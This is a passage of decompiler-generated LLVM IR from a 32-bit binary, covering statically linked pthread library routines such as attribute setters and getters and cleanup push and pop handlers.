  %v1_8058980 = select i1 %v8_8058975, i32 95, i32 22
  ret i32 %v1_8058980

dec_label_pc_8058984:                             ; preds = %entry
  %v1_8058988 = add i32 %arg1, 16
  %v2_8058988 = inttoptr i32 %v1_8058988 to i32*
  store i32 0, i32* %v2_8058988, align 4
  ret i32 0
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058996 = add i32 %arg1, 16
  %v2_8058996 = inttoptr i32 %v1_8058996 to i32*
  %v3_8058996 = load i32, i32* %v2_8058996, align 4
  store i32 %v3_8058996, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_80589a6 = add i32 %arg1, 20
  %v2_80589a6 = inttoptr i32 %v1_80589a6 to i32*
  %v3_80589a6 = load i32, i32* %v2_80589a6, align 4
  store i32 %v3_80589a6, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_80589ba = add i32 %arg1, 28
  %v3_80589ba = inttoptr i32 %v2_80589ba to i32*
  store i32 %arg2, i32* %v3_80589ba, align 4
  %v0_80589bf = load i32, i32* %edx.global-to-local, align 4
  %v1_80589bf = add i32 %v0_80589bf, 24
  %v2_80589bf = inttoptr i32 %v1_80589bf to i32*
  store i32 1, i32* %v2_80589bf, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_80589cb = add i32 %arg1, 28
  %v2_80589cb = inttoptr i32 %v1_80589cb to i32*
  %v3_80589cb = load i32, i32* %v2_80589cb, align 4
  store i32 %v3_80589cb, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp ult i32 %arg2, 16384
  br i1 %tmp3, label %dec_label_pc_80589f1, label %dec_label_pc_80589e8

dec_label_pc_80589e8:                             ; preds = %entry
  %v2_80589ec = add i32 %arg1, 32
  %v3_80589ec = inttoptr i32 %v2_80589ec to i32*
  store i32 %arg2, i32* %v3_80589ec, align 4
  br label %dec_label_pc_80589f1

dec_label_pc_80589f1:                             ; preds = %entry, %dec_label_pc_80589e8
  %v0_80589f1 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_80589e8 ]
  ret i32 %v0_80589f1

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80589f1, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_80589f6 = add i32 %arg1, 32
  %v2_80589f6 = inttoptr i32 %v1_80589f6 to i32*
  %v3_80589f6 = load i32, i32* %v2_80589f6, align 4
  store i32 %v3_80589f6, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058a02 = load i32, i32* @ebx, align 4
  store i32 %v0_8058a02, i32* %stack_var_-4, align 4
  %v1_8058a06 = call i32 @__GI_getpagesize(i32 %v0_8058a02)
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  %v2_8058a14 = sub i32 2097152, %v1_8058a06
  store i32 %v2_8058a14, i32* %edx.global-to-local, align 4
  %v2_8058a16 = add i32 %tmp1, 20
  %v3_8058a16 = inttoptr i32 %v2_8058a16 to i32*
  store i32 %v1_8058a06, i32* %v3_8058a16, align 4
  %v0_8058a19 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058a19 = inttoptr i32 %v0_8058a19 to i32*
  store i32 0, i32* %v1_8058a19, align 4
  %v0_8058a1f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058a1f = add i32 %v0_8058a1f, 4
  %v2_8058a1f = inttoptr i32 %v1_8058a1f to i32*
  store i32 0, i32* %v2_8058a1f, align 4
  %v0_8058a26 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058a26 = add i32 %v0_8058a26, 8
  %v2_8058a26 = inttoptr i32 %v1_8058a26 to i32*
  store i32 0, i32* %v2_8058a26, align 4
  %v0_8058a2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058a2d = add i32 %v0_8058a2d, 12
  %v2_8058a2d = inttoptr i32 %v1_8058a2d to i32*
  store i32 1, i32* %v2_8058a2d, align 4
  %v0_8058a34 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058a34 = add i32 %v0_8058a34, 16
  %v2_8058a34 = inttoptr i32 %v1_8058a34 to i32*
  store i32 0, i32* %v2_8058a34, align 4
  %v0_8058a3b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058a3b = add i32 %v0_8058a3b, 28
  %v2_8058a3b = inttoptr i32 %v1_8058a3b to i32*
  store i32 0, i32* %v2_8058a3b, align 4
  %v0_8058a42 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058a42 = add i32 %v0_8058a42, 24
  %v2_8058a42 = inttoptr i32 %v1_8058a42 to i32*
  store i32 0, i32* %v2_8058a42, align 4
  %v0_8058a49 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058a49 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058a49 = add i32 %v1_8058a49, 32
  %v3_8058a49 = inttoptr i32 %v2_8058a49 to i32*
  store i32 %v0_8058a49, i32* %v3_8058a49, align 4
  %v2_8058a4e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058a4e, i32* %edx.global-to-local, align 4
  %v2_8058a50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058a50, i32* %ebx.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 1, 0, 3, 2 }
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8058a53 = load i32, i32* @ebx, align 4
  %v1_8058a57 = call i32 @__GI_getpagesize(i32 %v0_8058a53)
  %v3_8058a66 = add i32 %arg2, -1
  %v4_8058a66 = add i32 %v3_8058a66, %v1_8058a57
  %tmp7 = urem i32 %v4_8058a66, %v1_8058a57
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8058a77 = sub i32 %v4_8058a66, %tmp7
  %v2_8058a7a = add i32 %arg1, 32
  %v3_8058a7a = inttoptr i32 %v2_8058a7a to i32*
  %v4_8058a7a = load i32, i32* %v3_8058a7a, align 4
  %v10_8058a7a = icmp ult i32 %v4_8058a77, %v4_8058a7a
  %v1_8058a7d = icmp eq i1 %v10_8058a7a, false
  br i1 %v1_8058a7d, label %dec_label_pc_8058a84, label %dec_label_pc_8058a7f

dec_label_pc_8058a7f:                             ; preds = %entry
  %v2_8058a7f = add i32 %arg1, 20
  %v3_8058a7f = inttoptr i32 %v2_8058a7f to i32*
  store i32 %v4_8058a77, i32* %v3_8058a7f, align 4
  %v10_8058a82 = load i32, i32* %eax.global-to-local, align 4
  %v11_8058a82 = and i32 %v10_8058a82, -256
  store i32 %v11_8058a82, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058a84

dec_label_pc_8058a84:                             ; preds = %entry, %dec_label_pc_8058a7f
  %v0_8058a87 = phi i32 [ 22, %entry ], [ %v11_8058a82, %dec_label_pc_8058a7f ]
  ret i32 %v0_8058a87

; uselistorder directives
  uselistorder label %dec_label_pc_8058a84, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8058a91 = add i32 %arg1, 8
  %v3_8058a99 = inttoptr i32 %arg2 to i16*
  %v4_8058a99 = call i32 @memcpy(i16* %v3_8058a99, i32 %v1_8058a91, i32 4)
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v1_8058ab2 = add i32 %arg1, 4
  %v2_8058ab2 = inttoptr i32 %v1_8058ab2 to i32*
  %v3_8058ab2 = load i32, i32* %v2_8058ab2, align 4
  %v1_8058ab5 = call i32 @sched_get_priority_max(i32 %v3_8058ab2)
  store i32 %v1_8058ab5, i32* @ebx, align 4
  %v0_8058abd = load i32, i32* @esi, align 4
  %v1_8058abd = add i32 %v0_8058abd, 4
  %v2_8058abd = inttoptr i32 %v1_8058abd to i32*
  %v3_8058abd = load i32, i32* %v2_8058abd, align 4
  %v1_8058ac0 = call i32 @sched_get_priority_min(i32 %v3_8058abd)
  %v0_8058ac5 = load i32, i32* @edi, align 4
  %v1_8058ac5 = inttoptr i32 %v0_8058ac5 to i32*
  %v2_8058ac5 = load i32, i32* %v1_8058ac5, align 4
  %v5_8058acc = icmp slt i32 %v2_8058ac5, %v1_8058ac0
  br i1 %v5_8058acc, label %dec_label_pc_8058ae6, label %dec_label_pc_8058ace

dec_label_pc_8058ace:                             ; preds = %entry
  %v1_8058ace = load i32, i32* @ebx, align 4
  %v8_8058ad0 = icmp sgt i32 %v2_8058ac5, %v1_8058ace
  br i1 %v8_8058ad0, label %dec_label_pc_8058ae6, label %dec_label_pc_8058ad2

dec_label_pc_8058ad2:                             ; preds = %dec_label_pc_8058ace
  %v0_8058ad3 = load i32, i32* @esi, align 4
  %v1_8058ad3 = add i32 %v0_8058ad3, 8
  %v3_8058ada = inttoptr i32 %v1_8058ad3 to i16*
  %v4_8058ada = call i32 @memcpy(i16* %v3_8058ada, i32 %v0_8058ac5, i32 4)
  br label %dec_label_pc_8058aeb

dec_label_pc_8058ae6:                             ; preds = %dec_label_pc_8058ace, %entry
  br label %dec_label_pc_8058aeb

dec_label_pc_8058aeb:                             ; preds = %dec_label_pc_8058ad2, %dec_label_pc_8058ae6
  %v0_8058aee = phi i32 [ 0, %dec_label_pc_8058ad2 ], [ 22, %dec_label_pc_8058ae6 ]
  ret i32 %v0_8058aee

; uselistorder directives
  uselistorder label %dec_label_pc_8058aeb, { 1, 0 }
}

define i32 @thread_self.12(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8058af0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8058af0, i32* @edx, align 4
  %v0_8058af7 = load i32, i32* @esp, align 4
  %v1_8058af7 = load i32, i32* @global_var_807a620.650, align 32
  %v7_8058af7 = icmp ult i32 %v0_8058af7, %v1_8058af7
  %v1_8058afd = icmp eq i1 %v7_8058af7, false
  br i1 %v1_8058afd, label %dec_label_pc_8058b2e, label %dec_label_pc_8058aff

dec_label_pc_8058aff:                             ; preds = %entry
  %v1_8058aff = load i32, i32* @global_var_807a624.651, align 4
  %v7_8058aff = icmp ult i32 %v0_8058af7, %v1_8058aff
  br i1 %v7_8058aff, label %dec_label_pc_8058b14, label %dec_label_pc_8058b07

dec_label_pc_8058b07:                             ; preds = %dec_label_pc_8058aff
  %v1_8058b0c = load i32, i32* @global_var_807a628.653, align 8
  %v7_8058b0c = icmp ult i32 %v0_8058af7, %v1_8058b0c
  br i1 %v7_8058b0c, label %dec_label_pc_8058b2e, label %dec_label_pc_8058b14

dec_label_pc_8058b14:                             ; preds = %dec_label_pc_8058b07, %dec_label_pc_8058aff
  %v0_8058b14 = load i32, i32* @global_var_807e100.654, align 256
  %v1_8058b14 = icmp eq i32 %v0_8058b14, 0
  br i1 %v1_8058b14, label %dec_label_pc_8058b22, label %dec_label_pc_8058b1d

dec_label_pc_8058b1d:                             ; preds = %dec_label_pc_8058b14
  %v0_8058b1d = call i32 @__pthread_find_self()
  br label %dec_label_pc_8058b22

dec_label_pc_8058b22:                             ; preds = %dec_label_pc_8058b14, %dec_label_pc_8058b1d
  %v3_8058b22 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_8058b22, i32* @edx, align 4
  %v2_8058b28 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8058b2e

dec_label_pc_8058b2e:                             ; preds = %dec_label_pc_8058b07, %entry, %dec_label_pc_8058b22
  %v0_8058b2e = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_8058b07 ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_8058b28, %dec_label_pc_8058b22 ]
  ret i32 %v0_8058b2e

; uselistorder directives
  uselistorder label %dec_label_pc_8058b2e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058b22, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8058b2f = load i32, i32* @edi, align 4
  %v0_8058b30 = load i32, i32* @esi, align 4
  %v0_8058b31 = load i32, i32* @ebx, align 4
  store i32 %v0_8058b31, i32* %stack_var_-12, align 4
  %v1_8058b32 = call i32 @thread_self.12(i32 %v0_8058b31)
  store i32 %v1_8058b32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %v1_8058b32, i32* %esi.global-to-local, align 4
  %v1_8058b3d = add i32 %v1_8058b32, 60
  %v2_8058b3d = inttoptr i32 %v1_8058b3d to i32*
  %v3_8058b3d = load i32, i32* %v2_8058b3d, align 4
  store i32 %v3_8058b3d, i32* %ebx.global-to-local, align 4
  %v1_8058b542 = icmp eq i32 %v3_8058b3d, 0
  %v1_8058b569 = icmp eq i1 %v1_8058b542, false
  br i1 %v1_8058b569, label %dec_label_pc_8058b42.lr.ph, label %dec_label_pc_8058b58

dec_label_pc_8058b42.lr.ph:                       ; preds = %entry
  %tmp = icmp ugt i32 %v3_8058b3d, %arg1
  br i1 %tmp, label %dec_label_pc_8058b46.lr.ph, label %dec_label_pc_8058b58.loopexit

dec_label_pc_8058b46.lr.ph:                       ; preds = %dec_label_pc_8058b42.lr.ph
  br label %dec_label_pc_8058b46

dec_label_pc_8058b46:                             ; preds = %dec_label_pc_8058b46.dec_label_pc_8058b42_crit_edge, %dec_label_pc_8058b46.lr.ph
  %v4_8058b4c29 = phi i32 [ %v3_8058b3d, %dec_label_pc_8058b46.lr.ph ], [ %v3_8058b4e, %dec_label_pc_8058b46.dec_label_pc_8058b42_crit_edge ]
  %v5_8058b4c = inttoptr i32 %v4_8058b4c29 to i32*
  %v6_8058b4c = load i32, i32* %v5_8058b4c, align 4
  call void @__pseudo_call(i32 %v6_8058b4c)
  %v0_8058b4e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058b4e = add i32 %v0_8058b4e, 12
  %v2_8058b4e = inttoptr i32 %v1_8058b4e to i32*
  %v3_8058b4e = load i32, i32* %v2_8058b4e, align 4
  store i32 %v3_8058b4e, i32* %ebx.global-to-local, align 4
  %v1_8058b54 = icmp eq i32 %v3_8058b4e, 0
  %v1_8058b56 = icmp eq i1 %v1_8058b54, false
  br i1 %v1_8058b56, label %dec_label_pc_8058b46.dec_label_pc_8058b42_crit_edge, label %dec_label_pc_8058b58.loopexit

dec_label_pc_8058b46.dec_label_pc_8058b42_crit_edge: ; preds = %dec_label_pc_8058b46
  %v1_8058b42.pre = load i32, i32* %edi.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v3_8058b4e, %v1_8058b42.pre
  br i1 %tmp32, label %dec_label_pc_8058b46, label %dec_label_pc_8058b58.loopexit

dec_label_pc_8058b58.loopexit:                    ; preds = %dec_label_pc_8058b46.dec_label_pc_8058b42_crit_edge, %dec_label_pc_8058b42.lr.ph, %dec_label_pc_8058b46
  %v0_8058b58.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8058b58

dec_label_pc_8058b58:                             ; preds = %dec_label_pc_8058b58.loopexit, %entry
  %v0_8058b58 = phi i32 [ %v0_8058b58.pre, %dec_label_pc_8058b58.loopexit ], [ %v1_8058b32, %entry ]
  %v1_8058b58 = add i32 %v0_8058b58, 372
  %v2_8058b58 = inttoptr i32 %v1_8058b58 to i32*
  %v3_8058b58 = load i32, i32* %v2_8058b58, align 4
  %v4_8058b58 = icmp eq i32 %v3_8058b58, 0
  br i1 %v4_8058b58, label %dec_label_pc_8058b58.dec_label_pc_8058b69_crit_edge, label %dec_label_pc_8058b61

dec_label_pc_8058b58.dec_label_pc_8058b69_crit_edge: ; preds = %dec_label_pc_8058b58
  %v0_8058b6c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058b69

dec_label_pc_8058b61:                             ; preds = %dec_label_pc_8058b58
  %v2_8058b61 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058b61, i32* @ebx, align 4
  store i32 %v0_8058b30, i32* @esi, align 4
  store i32 %v0_8058b2f, i32* @edi, align 4
  %v0_8058b64 = call i32 @__rpc_thread_destroy()
  store i32 %v0_8058b64, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058b69

dec_label_pc_8058b69:                             ; preds = %dec_label_pc_8058b58.dec_label_pc_8058b69_crit_edge, %dec_label_pc_8058b61
  %v0_8058b6c = phi i32 [ %v0_8058b6c.pre, %dec_label_pc_8058b58.dec_label_pc_8058b69_crit_edge ], [ %v0_8058b64, %dec_label_pc_8058b61 ]
  %v2_8058b69 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058b69, i32* @ebx, align 4
  store i32 %v0_8058b30, i32* @esi, align 4
  store i32 %v0_8058b2f, i32* @edi, align 4
  ret i32 %v0_8058b6c

; uselistorder directives
  uselistorder i32 %v3_8058b4e, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8058b3d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8058b30, { 1, 0 }
  uselistorder i32 %v0_8058b2f, { 1, 0 }
  uselistorder label %dec_label_pc_8058b69, { 1, 0 }
  uselistorder label %dec_label_pc_8058b58.loopexit, { 0, 2, 1 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058b6d = load i32, i32* @ebx, align 4
  store i32 %v0_8058b6d, i32* %stack_var_-4, align 4
  %v1_8058b71 = call i32 @thread_self.12(i32 %v0_8058b6d)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_8058b71, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_8058b86 = add i32 %tmp3, 4
  %v3_8058b86 = inttoptr i32 %v2_8058b86 to i32*
  store i32 %arg3, i32* %v3_8058b86, align 4
  %v0_8058b89 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058b89 = add i32 %v0_8058b89, 65
  %v2_8058b89 = inttoptr i32 %v1_8058b89 to i8*
  %v3_8058b89 = load i8, i8* %v2_8058b89, align 1
  %v4_8058b89 = sext i8 %v3_8058b89 to i32
  %v1_8058b8d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058b8d = add i32 %v1_8058b8d, 8
  %v3_8058b8d = inttoptr i32 %v2_8058b8d to i32*
  store i32 %v4_8058b89, i32* %v3_8058b8d, align 4
  %v0_8058b90 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058b90 = add i32 %v0_8058b90, 60
  %v2_8058b90 = inttoptr i32 %v1_8058b90 to i32*
  %v3_8058b90 = load i32, i32* %v2_8058b90, align 4
  %v1_8058b93 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058b93 = add i32 %v1_8058b93, 12
  %v3_8058b93 = inttoptr i32 %v2_8058b93 to i32*
  store i32 %v3_8058b90, i32* %v3_8058b93, align 4
  %v1_8058b96 = icmp eq i32 %v3_8058b90, 0
  br i1 %v1_8058b96, label %dec_label_pc_8058ba5, label %dec_label_pc_8058b9a

dec_label_pc_8058b9a:                             ; preds = %entry
  %v0_8058b9a = load i32, i32* %ebx.global-to-local, align 4
  %v7_8058b9a = icmp ult i32 %v0_8058b9a, %v3_8058b90
  br i1 %v7_8058b9a, label %dec_label_pc_8058ba5, label %dec_label_pc_8058b9e

dec_label_pc_8058b9e:                             ; preds = %dec_label_pc_8058b9a
  %v1_8058b9e = add i32 %v0_8058b9a, 12
  %v2_8058b9e = inttoptr i32 %v1_8058b9e to i32*
  store i32 0, i32* %v2_8058b9e, align 4
  br label %dec_label_pc_8058ba5

dec_label_pc_8058ba5:                             ; preds = %dec_label_pc_8058b9a, %entry, %dec_label_pc_8058b9e
  %v0_8058ba5 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058ba5 = add i32 %v0_8058ba5, 65
  %v2_8058ba5 = inttoptr i32 %v1_8058ba5 to i8*
  store i8 0, i8* %v2_8058ba5, align 1
  %v0_8058ba9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058ba9 = load i32, i32* %edx.global-to-local, align 4
  %v2_8058ba9 = add i32 %v1_8058ba9, 60
  %v3_8058ba9 = inttoptr i32 %v2_8058ba9 to i32*
  store i32 %v0_8058ba9, i32* %v3_8058ba9, align 4
  %v2_8058bac = load i32, i32* %stack_var_-12, align 4
  %v2_8058bae = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058bae, i32* @ebx, align 4
  ret i32 %v2_8058bac

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_8058ba5, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  %v4_8058bb8 = icmp eq i32 %arg2, 0
  br i1 %v4_8058bb8, label %dec_label_pc_8058bca, label %dec_label_pc_8058bbf

dec_label_pc_8058bbf:                             ; preds = %entry
  %v6_8058bc5 = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_8058bc5)
  br label %dec_label_pc_8058bca

dec_label_pc_8058bca:                             ; preds = %entry, %dec_label_pc_8058bbf
  %v0_8058bca = phi i32 [ %tmp7, %entry ], [ 134581191, %dec_label_pc_8058bbf ]
  %v1_8058bca = call i32 @thread_self.12(i32 %v0_8058bca)
  %v0_8058bcf = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058bcf = add i32 %v0_8058bcf, 12
  %v2_8058bcf = inttoptr i32 %v1_8058bcf to i32*
  %v3_8058bcf = load i32, i32* %v2_8058bcf, align 4
  %v2_8058bd2 = add i32 %v1_8058bca, 60
  %v3_8058bd2 = inttoptr i32 %v2_8058bd2 to i32*
  store i32 %v3_8058bcf, i32* %v3_8058bd2, align 4
  %v2_8058bd5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058bd5, i32* @ecx, align 4
  ret i32 %v1_8058bca

; uselistorder directives
  uselistorder label %dec_label_pc_8058bca, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058bd9 = load i32, i32* @ebx, align 4
  store i32 %v0_8058bd9, i32* %stack_var_-4, align 4
  %v1_8058bdd = call i32 @thread_self.12(i32 %v0_8058bd9)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_8058bdd, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_8058bf2 = add i32 %tmp3, 4
  %v3_8058bf2 = inttoptr i32 %v2_8058bf2 to i32*
  store i32 %arg3, i32* %v3_8058bf2, align 4
  %v0_8058bf5 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058bf5 = add i32 %v0_8058bf5, 60
  %v2_8058bf5 = inttoptr i32 %v1_8058bf5 to i32*
  %v3_8058bf5 = load i32, i32* %v2_8058bf5, align 4
  %v1_8058bf8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058bf8 = add i32 %v1_8058bf8, 12
  %v3_8058bf8 = inttoptr i32 %v2_8058bf8 to i32*
  store i32 %v3_8058bf5, i32* %v3_8058bf8, align 4
  %v1_8058bfb = icmp eq i32 %v3_8058bf5, 0
  br i1 %v1_8058bfb, label %dec_label_pc_8058c0a, label %dec_label_pc_8058bff

dec_label_pc_8058bff:                             ; preds = %entry
  %v0_8058bff = load i32, i32* %ebx.global-to-local, align 4
  %v7_8058bff = icmp ult i32 %v0_8058bff, %v3_8058bf5
  br i1 %v7_8058bff, label %dec_label_pc_8058c0a, label %dec_label_pc_8058c03

dec_label_pc_8058c03:                             ; preds = %dec_label_pc_8058bff
  %v1_8058c03 = add i32 %v0_8058bff, 12
  %v2_8058c03 = inttoptr i32 %v1_8058c03 to i32*
  store i32 0, i32* %v2_8058c03, align 4
  br label %dec_label_pc_8058c0a

dec_label_pc_8058c0a:                             ; preds = %dec_label_pc_8058bff, %entry, %dec_label_pc_8058c03
  %v0_8058c0a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058c0a = load i32, i32* %edx.global-to-local, align 4
  %v2_8058c0a = add i32 %v1_8058c0a, 60
  %v3_8058c0a = inttoptr i32 %v2_8058c0a to i32*
  store i32 %v0_8058c0a, i32* %v3_8058c0a, align 4
  %v2_8058c0d = load i32, i32* %stack_var_-12, align 4
  %v2_8058c0f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058c0f, i32* @ebx, align 4
  ret i32 %v2_8058c0d

; uselistorder directives
  uselistorder label %dec_label_pc_8058c0a, { 2, 0, 1 }
}

define i32 @__pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8058c12 = load i32, i32* @ebx, align 4
  store i32 %v0_8058c12, i32* %stack_var_-8, align 4
  %v15_8058c13 = ptrtoint i32* %stack_var_-12 to i32
  %v1_8058c16 = call i32 @thread_self.12(i32 %v0_8058c12)
  store i32 %v1_8058c16, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  store i32 %v1_8058c16, i32* @ebx, align 4
  %v4_8058c21 = icmp eq i32 %arg2, 0
  br i1 %v4_8058c21, label %dec_label_pc_8058c33, label %dec_label_pc_8058c28

dec_label_pc_8058c28:                             ; preds = %entry
  %v6_8058c2e = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_8058c2e)
  %v0_8058c33.pre = load i32, i32* @esi, align 4
  %v1_8058c36.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058c33

dec_label_pc_8058c33:                             ; preds = %entry, %dec_label_pc_8058c28
  %v1_8058c36 = phi i32 [ %v1_8058c16, %entry ], [ %v1_8058c36.pre, %dec_label_pc_8058c28 ]
  %v0_8058c33 = phi i32 [ %tmp4, %entry ], [ %v0_8058c33.pre, %dec_label_pc_8058c28 ]
  %v1_8058c33 = add i32 %v0_8058c33, 12
  %v2_8058c33 = inttoptr i32 %v1_8058c33 to i32*
  %v3_8058c33 = load i32, i32* %v2_8058c33, align 4
  store i32 %v3_8058c33, i32* %eax.global-to-local, align 4
  %v2_8058c36 = add i32 %v1_8058c36, 60
  %v3_8058c36 = inttoptr i32 %v2_8058c36 to i32*
  store i32 %v3_8058c33, i32* %v3_8058c36, align 4
  %v0_8058c39 = load i32, i32* @esi, align 4
  %v1_8058c39 = add i32 %v0_8058c39, 8
  %v2_8058c39 = inttoptr i32 %v1_8058c39 to i32*
  %v3_8058c39 = load i32, i32* %v2_8058c39, align 4
  store i32 %v3_8058c39, i32* %eax.global-to-local, align 4
  %v1_8058c3c = trunc i32 %v3_8058c39 to i8
  %v2_8058c3c = load i32, i32* @ebx, align 4
  %v3_8058c3c = add i32 %v2_8058c3c, 65
  %v4_8058c3c = inttoptr i32 %v3_8058c3c to i8*
  store i8 %v1_8058c3c, i8* %v4_8058c3c, align 1
  %v0_8058c3f = load i32, i32* @ebx, align 4
  %v1_8058c3f = add i32 %v0_8058c3f, 66
  %v2_8058c3f = inttoptr i32 %v1_8058c3f to i8*
  %v3_8058c3f = load i8, i8* %v2_8058c3f, align 1
  %v4_8058c3f = icmp eq i8 %v3_8058c3f, 0
  br i1 %v4_8058c3f, label %dec_label_pc_8058c5b, label %dec_label_pc_8058c45

dec_label_pc_8058c45:                             ; preds = %dec_label_pc_8058c33
  %v1_8058c45 = add i32 %v0_8058c3f, 64
  %v2_8058c45 = inttoptr i32 %v1_8058c45 to i16*
  %v3_8058c45 = load i16, i16* %v2_8058c45, align 2
  %v9_8058c45 = icmp eq i16 %v3_8058c45, 256
